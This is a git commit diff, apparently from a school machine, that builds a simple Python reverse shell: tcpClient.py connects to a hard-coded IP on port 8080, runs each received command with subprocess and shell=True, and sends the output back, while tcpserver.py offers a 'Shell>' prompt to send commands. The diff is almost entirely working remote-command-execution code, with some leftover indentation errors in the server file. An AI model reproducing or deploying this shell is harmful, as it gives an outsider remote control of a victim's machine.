f2233a4214bf2fc8ff311d2f2aa7fd5138aec917
root <root@CG-JKYJ992.cottpr.portsmouth.sch.uk>
2020-11-18 15:52:43 +0000

    V1

--- tcpClient.py
+++ tcpClient.py
@@ -3,7 +3,20 @@ import subprocess # See video https://www.youtube.com/watch?v=2Fp1N6dof0Y
 
 def connect():
     s = socket.socket()
-    s.connect("192.168.1.166",8080))
+    s.connect(("10.174.15.6",8080))
     while True:
         command = s.recv(1024)
-        if "terminart
+        if "terminate" in command.decode():
+            s.close()
+            break
+        else:
+            # See the video above which explains how the subprocess element works
+            # A pipe has two endpoints
+            CMD = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            s.send(CMD.stdout.read())
+            s.send(CMD.stderr.read())
+
+def main():
+    connect()
+main()
+    
--- tcpserver.py
+++ tcpserver.py
@@ -1,13 +1,13 @@
 import socket
 #  Test if its running netstat -antp | grep 8080
 #  on windows netstat -ano
-    s = socket.socket()
-    s.bind(("192.168.1.183", 8080))
-    s.listen(1)
-    conn, addr = s.accept()
-    print ("[+] We got a connection from",addr)
+s = socket.socket()
+s.bind(("10.174.15.6", 8080))
+s.listen(1)
+conn, addr = s.accept()
+print ("[+] We got a connection from",addr)
     
-    while True:
+while True:
         command = input("Shell>")
         if "terminate" in command:
             conn.send("terminate".encode())
